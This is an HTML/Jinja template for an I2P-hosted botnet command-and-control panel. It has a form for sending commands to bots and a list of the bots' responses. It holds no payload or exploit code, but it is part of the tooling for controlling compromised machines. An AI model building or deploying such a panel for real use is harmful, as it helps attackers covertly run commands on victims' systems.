<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>C2 Panel - I2P</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <style>
    body { background-color: #121212; color: #fff; }
    .navbar { background-color: #1f1f1f; }
    .card { background-color: #2a2a2a; border: none; }
    .form-control, .btn { border-radius: 0; }
  </style>
</head>
<body>
  <nav class="navbar navbar-dark">
    <div class="container-fluid">
      <span class="navbar-brand">üïµÔ∏è‚Äç‚ôÇÔ∏è I2P Command & Control Panel</span>
    </div>
  </nav>
  <div class="container mt-4">
    <div class="row">
      <div class="col-md-4">
        <h4>Add Command</h4>
        <form method="POST" action="/send_command">
          <input type="text" name="command" class="form-control mb-2" placeholder="Enter command" required/>
          <button class="btn btn-primary w-100">Send</button>
        </form>
      </div>
      <div class="col-md-8">
        <h4>Bot Responses</h4>
        <div class="card p-3">
          {% for bot in bots %}
            <div class="mb-2">
              <strong>{{ bot[1] }}</strong>:<br/>
              <pre style="white-space: pre-wrap;">{{ bot[2] }}</pre>
            </div>
          {% endfor %}
        </div>
      </div>
    </div>
  </div>
</body>
</html>
